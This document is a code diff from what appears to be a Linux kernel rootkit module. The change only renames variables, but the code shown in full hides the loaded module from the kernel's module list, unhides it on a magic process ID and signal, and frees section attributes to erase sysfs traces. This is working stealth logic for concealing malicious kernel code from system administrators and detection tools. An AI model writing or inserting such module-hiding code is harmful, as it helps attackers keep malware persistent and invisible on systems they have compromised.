@@ -24,22 +24,22 @@
 #define INVIS_PID 32742
 #define INVIS_SIG 42
 
-static struct list_head* p_prev_module = NULL;
-static short is_first_hide = 1;
-static short is_module_hidden = 0;
+static struct list_head* _p_prev_module = NULL;
+static short _is_first_hide = 1;
+static short _is_module_hidden = 0;
 
 static void module_hide(void)
 {
-    p_prev_module = THIS_MODULE->list.prev;
+    _p_prev_module = THIS_MODULE->list.prev;
     list_del(&THIS_MODULE->list);
-    is_module_hidden = 1;
+    _is_module_hidden = 1;
 }
 
 static void module_show(void)
 {
-    list_add(&THIS_MODULE->list, p_prev_module);
-    p_prev_module = NULL;
-    is_module_hidden = 0;
+    list_add(&THIS_MODULE->list, _p_prev_module);
+    _p_prev_module = NULL;
+    _is_module_hidden = 0;
 }
 
 void ch_visibility_status(pid_t pid, int sig)
@@ -51,15 +51,15 @@ void ch_visibility_status(pid_t pid, int sig)
         return;
     }
     
-    if (is_module_hidden) {
+    if (_is_module_hidden) {
         // Show module.
         module_show();
     } else {
         // Hide module.
         module_hide();
 
-        if (is_first_hide) {
-            is_first_hide = 0;
+        if (_is_first_hide) {
+            _is_first_hide = 0;
             kfree(THIS_MODULE->sect_attrs);
             THIS_MODULE->sect_attrs = NULL;
         }
